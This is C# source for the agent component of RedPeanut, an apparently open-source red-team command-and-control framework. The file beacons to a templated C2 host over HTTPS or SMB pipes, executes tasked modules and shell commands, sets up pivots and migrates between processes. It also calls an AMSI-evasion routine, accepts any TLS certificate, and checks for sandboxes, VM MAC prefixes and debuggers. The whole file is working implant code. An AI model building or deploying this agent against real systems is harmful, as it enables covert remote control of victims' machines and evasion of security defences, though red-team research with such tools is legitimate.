//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web.Script.Serialization;

namespace RedPeanutAgent
{
    public class Program
    {
        public static void Execute(string json, string cookie, NamedPipeClientStream pipe)
        {
            Worker worker = new Worker(json, cookie, pipe);
            worker.Run();
        }
    }

    public class Worker
    {
        public string[] pageget = {
               #PAGEGET#
            };
        public string[] pagepost = {
        	    #PAGEPOST#
            };

        public byte[] aeskey;
        public byte[] aesiv;
        public string agentid = "";

        public string param = "#PARAM#";
        public string serverkey = "#SERVERKEY#";
        public string host = "#HOST#";
        public int port = int.Parse("#PORT#");
        public string namedpipe = "#PIPENAME#";
        public string spawnp = "#SPAWN#";
        public bool isCovered = bool.Parse("#COVERED#");
        public bool injectionmanaged = bool.Parse("#MANAGED#");
        public string targetclass = "#TARGETCLASS#";

        public bool blockdlls = false;
        public bool amsievasion = true;

        public NamedPipeClientStream pipe;
        public Core.Utility.CookiedWebClient wc;

        public Dictionary<string, List<Core.Utility.TaskMsg>> commands = new Dictionary<string, List<Core.Utility.TaskMsg>>();

        public Worker(string json, string cookie, NamedPipeClientStream pipe)
        {
            Random r = new Random();
            this.pipe = pipe;
            Core.Utility.AgentIdMsg agentidmsg = Core.Utility.GetAgentId(json);
            agentid = agentidmsg.agentid;
            aeskey = Convert.FromBase64String(agentidmsg.sessionkey);
            aesiv = Convert.FromBase64String(agentidmsg.sessioniv);

            this.wc = CreateWebClient(cookie, host);

            string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);

            if (this.pipe != null)
            {
                Core.Utility.SendCheckinSMB(agentid, aeskey, aesiv, this.pipe);
            }
            else
            {
                Core.Utility.SendCheckinHttp(agentid, aeskey, aesiv, rpaddress, param, wc);
            }
        }

        public Worker()
        {

        }
        
        public void LoadAndRun(string[] arguments)
        {
            RedPeanutAgent.Evasion.Evasion.Evade(amsievasion);

            string reasargs = string.Empty;
            foreach (string s in arguments)
                reasargs += s;
            string json = Encoding.Default.GetString(Core.Utility.DecompressDLL(Convert.FromBase64String(reasargs)));
            Core.Utility.AgentState agentState = new JavaScriptSerializer().Deserialize<Core.Utility.AgentState>(json);
            Random r = new Random();

            agentid = agentState.Agentid;
            aeskey = Convert.FromBase64String(agentState.sessionkey);
            aesiv = Convert.FromBase64String(agentState.sessioniv);

            if (agentState.pipename != null)
            {
                //Crete pipe client
                this.pipe = CreatePipeClient(agentState.pipename);
            }
            else
            {
                this.wc = CreateWebClient(agentState.cookie, host);
            }

            //Send response message to task request sent to preceding process
            //Need to create a dirty Task cause Instanceid need to be set
            Core.Utility.TaskMsg task = new Core.Utility.TaskMsg();
            task.Instanceid = agentState.RequestInstanceid;
            Execution.CommandExecuter commandOutuput = new Execution.CommandExecuter(task, this);

            string output = string.Format("[*] Agent successfully migrated to {0}", Process.GetCurrentProcess().ProcessName);

            commandOutuput.SendResponse(output);

            Run();

        }

        private void Reconnect(string agentid, byte[] aeskey, byte[] aesiv, string param, Core.Utility.CookiedWebClient wc)
        {
            bool connected = false;
            injectionmanaged = bool.Parse("#MANAGED#");
            while (!connected)
            {
                try
                {
                    string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);

                    if (this.pipe == null)
                    {
                        Core.Utility.SendCheckinHttp(agentid, aeskey, aesiv, rpaddress, param, wc);
                        connected = true;
                    }
                }
                catch (Exception)
                {

                }
                //More delay here?
                int rInt = GetDelay();
                Thread.Sleep(rInt * 1000);
            }


        }

        private NamedPipeClientStream CreatePipeClient(string pipename)
        {
            NamedPipeClientStream pipe;
            try
            {
                pipe = new NamedPipeClientStream(host, pipename, PipeDirection.InOut, PipeOptions.Asynchronous);
                pipe.Connect(5000);
                pipe.ReadMode = PipeTransmissionMode.Message;
                return pipe;
            }
            catch (Exception)
            {
                return null;
            }
        }

        private Core.Utility.CookiedWebClient CreateWebClient(string cookie, string host)
        {
            Core.Utility.CookiedWebClient wc = new Core.Utility.CookiedWebClient();

            WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
            webHeaderCollection.Add(HttpRequestHeader.UserAgent, "#USERAGENT#");

            #HEADERS#

            wc.Headers = webHeaderCollection;

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.DefaultConnectionLimit = 9999;

            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(
                    delegate
                    { return true; }
                );

            string[] hhosts = webHeaderCollection.GetValues("Host");
            if (hhosts != null)
            {
                foreach (string s in webHeaderCollection.GetValues("Host"))
                    wc.Add(new Cookie("sessionid", cookie, "/", s));
            }

            wc.Add(new Cookie("sessionid", cookie, "/", host));

            return wc;
        }

        public int GetDelay()
        {
            Random r = new Random();
            //TODO manage max delay via config
            int maxdelay = 8;
            return r.Next(5, maxdelay);
        }

        public void Run()
        {
            List<string> smblisteners = new List<string>();

            Random r = new Random();
            int rInt = GetDelay();


            Thread servert = null;
            bool smbstarted = false;

            while (true)
            {
                try
                {
                    string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pageget[r.Next(pageget.Length)]);
                    Core.Utility.TaskMsg task = null;

                    if (pipe != null)
                    {
                        task = Core.Utility.GetTaskSMB(aeskey, aesiv, pipe);
                    }
                    else
                    {
                        if (wc != null)
                            task = Core.Utility.GetTaskHttp(wc, aeskey, aesiv, rpaddress, targetclass, isCovered);
                    }

                    if (task != null)
                    {
                        if (task.Agentid.Equals(agentid))
                        {
                            switch (task.TaskType)
                            {
                                case "module":
                                    try
                                    {
                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                        Thread commandthread;
                                        if (injectionmanaged)
                                        {
                                            commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleManaged));
                                        }
                                        else
                                        {
                                            if (blockdlls)
                                            {
                                                commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleUnManagedBlockDll));
                                            }
                                            else
                                            {
                                                commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleUnManaged));
                                            }
                                        }
                                        commandthread.Start();
                                    }
                                    catch (Exception)
                                    {

                                    }
                                    break;
                                case "pivot":
                                    string output;
                                    if (!smbstarted)
                                    {
                                        try
                                        {
                                            C2.SmbListener smblistener = new C2.SmbListener(agentid, agentid, this);
                                            servert = new Thread(new ThreadStart(smblistener.Execute));
                                            servert.Start();
                                            smbstarted = true;
                                            Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                            output = string.Format("[*] Pivot created. Pipe name {0}", agentid);
                                        }
                                        catch (Exception e)
                                        {
                                            output = string.Format("[*] Create pivot error: {0}", e.Message);
                                        }
                                    }
                                    else
                                    {
                                        output = string.Format("[*] Pivot listener already exists");
                                    }

                                    Execution.CommandExecuter commandOutuput = new Execution.CommandExecuter(task, this);
                                    commandOutuput.SendResponse(output);
                                    break;
                                case "download":
                                    try
                                    {
                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleManaged));
                                        commandthread.Start();
                                    }
                                    catch (Exception)
                                    {

                                    }
                                    break;
                                case "standard":
                                    try
                                    {
                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                        commandExecuter.ExecuteModuleManaged();
                                    }
                                    catch (RedPeanutAgent.Core.Utility.EndOfLifeException e)
                                    {
                                        throw e;
                                    }
                                    catch (Exception)
                                    {

                                    }
                                    break;
                                case "managed":
                                    injectionmanaged = task.InjectionManagedTask.Managed;
                                    Execution.CommandExecuter commandManaged = new Execution.CommandExecuter(task, this);
                                    commandManaged.SendResponse(string.Format("[*] Agent now in {0} mode", injectionmanaged == true ? "Managed" : "Unmanaged"));
                                    break;
                                case "blockdlls":
                                    blockdlls = task.BlockDllsTask.Block;
                                    Execution.CommandExecuter commandBlockDlls = new Execution.CommandExecuter(task, this);
                                    if(blockdlls)
                                        commandBlockDlls.SendResponse("[*] Agent now block non Microsoft Dlls in child process");
                                    else
                                        commandBlockDlls.SendResponse("[*] Agent now not block non Microsoft Dlls in child process");
                                    break;
                                case "migrate":
                                    try
                                    {
                                        Console.WriteLine(task.Instanceid);
                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                        commandExecuter.ExecuteModuleManaged();
                                    }
                                    catch (RedPeanutAgent.Core.Utility.EndOfLifeException)
                                    {
                                        throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
                                    }
                                    catch (Exception)
                                    {

                                    }
                                    break;
                                default:
                                    try
                                    {
                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteCmd));
                                        commandthread.Start();
                                    }
                                    catch (Exception)
                                    {

                                    }
                                    break;
                            }
                        }
                        else
                        {
                            if (task.AgentPivot.Equals(agentid))
                            {
                                try
                                {
                                    //Route message to agent
                                    if (!commands.ContainsKey(task.Agentid))
                                        commands.Add(task.Agentid, new List<Core.Utility.TaskMsg>());

                                    commands.TryGetValue(task.Agentid, out List<Core.Utility.TaskMsg> list);
                                    list.Add(task);
                                }
                                catch (Exception)
                                {

                                }
                            }
                            else
                            {
                                //Console.WriteLine("[*] Error routing message");
                            }
                        }
                    }
                }
                catch (RedPeanutAgent.Core.Utility.EndOfLifeException)
                {
                    SystemException ex = new SystemException();
                    ex.Data["reason"] = "exit";
                    throw ex;
                }
                catch (WebException e)
                {
                    HttpWebResponse errorResponse = e.Response as HttpWebResponse;
                    if (errorResponse == null || errorResponse.StatusCode != HttpStatusCode.NotFound)
                        Reconnect(agentid, aeskey, aesiv, param, wc);
                }
                catch (Exception)
                {
                    Reconnect(agentid, aeskey, aesiv, param, wc);
                }

                Thread.Sleep(rInt * 1000);
            }
        }

        //Sharpshooter
        // Returns true if possible sandbox artifacts exist on file system
        static public bool containsSandboxArtifacts()
        {
            List<string> EvidenceOfSandbox = new List<string>();
            string[] FilePaths = {@"C:\windows\Sysnative\Drivers\Vmmouse.sys",
        @"C:\windows\Sysnative\Drivers\vm3dgl.dll", @"C:\windows\Sysnative\Drivers\vmdum.dll",
        @"C:\windows\Sysnative\Drivers\vm3dver.dll", @"C:\windows\Sysnative\Drivers\vmtray.dll",
        @"C:\windows\Sysnative\Drivers\vmci.sys", @"C:\windows\Sysnative\Drivers\vmusbmouse.sys",
        @"C:\windows\Sysnative\Drivers\vmx_svga.sys", @"C:\windows\Sysnative\Drivers\vmxnet.sys",
        @"C:\windows\Sysnative\Drivers\VMToolsHook.dll", @"C:\windows\Sysnative\Drivers\vmhgfs.dll",
        @"C:\windows\Sysnative\Drivers\vmmousever.dll", @"C:\windows\Sysnative\Drivers\vmGuestLib.dll",
        @"C:\windows\Sysnative\Drivers\VmGuestLibJava.dll", @"C:\windows\Sysnative\Drivers\vmscsi.sys",
        @"C:\windows\Sysnative\Drivers\VBoxMouse.sys", @"C:\windows\Sysnative\Drivers\VBoxGuest.sys",
        @"C:\windows\Sysnative\Drivers\VBoxSF.sys", @"C:\windows\Sysnative\Drivers\VBoxVideo.sys",
        @"C:\windows\Sysnative\vboxdisp.dll", @"C:\windows\Sysnative\vboxhook.dll",
        @"C:\windows\Sysnative\vboxmrxnp.dll", @"C:\windows\Sysnative\vboxogl.dll",
        @"C:\windows\Sysnative\vboxoglarrayspu.dll", @"C:\windows\Sysnative\vboxoglcrutil.dll",
        @"C:\windows\Sysnative\vboxoglerrorspu.dll", @"C:\windows\Sysnative\vboxoglfeedbackspu.dll",
        @"C:\windows\Sysnative\vboxoglpackspu.dll", @"C:\windows\Sysnative\vboxoglpassthroughspu.dll",
        @"C:\windows\Sysnative\vboxservice.exe", @"C:\windows\Sysnative\vboxtray.exe",
        @"C:\windows\Sysnative\VBoxControl.exe"};
            foreach (string FilePath in FilePaths)
            {
                if (File.Exists(FilePath))
                {
                    EvidenceOfSandbox.Add(FilePath);
                }
            }

            if (EvidenceOfSandbox.Count == 0)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        //Sharpshooter
        // Return true is machine matches a bad MAC vendor
        static public bool isBadMac()
        {
            List<string> EvidenceOfSandbox = new List<string>();

            string[] badMacAddresses = { @"000C29", @"001C14", @"005056", @"000569", @"080027" };

            NetworkInterface[] NICs = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface NIC in NICs)
            {
                foreach (string badMacAddress in badMacAddresses)
                {
                    if (NIC.GetPhysicalAddress().ToString().ToLower().Contains(badMacAddress.ToLower()))
                    {
                        EvidenceOfSandbox.Add(Regex.Replace(NIC.GetPhysicalAddress().ToString(), ".{2}", "$0:").TrimEnd(':'));
                    }
                }
            }

            if (EvidenceOfSandbox.Count == 0)
            {
                return false;
            }
            else
            {
                return true;
            }

        }

        //Sharpshooter
        // Return true if a debugger is attached
        static public bool isDebugged()
        {
            if (System.Diagnostics.Debugger.IsAttached)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
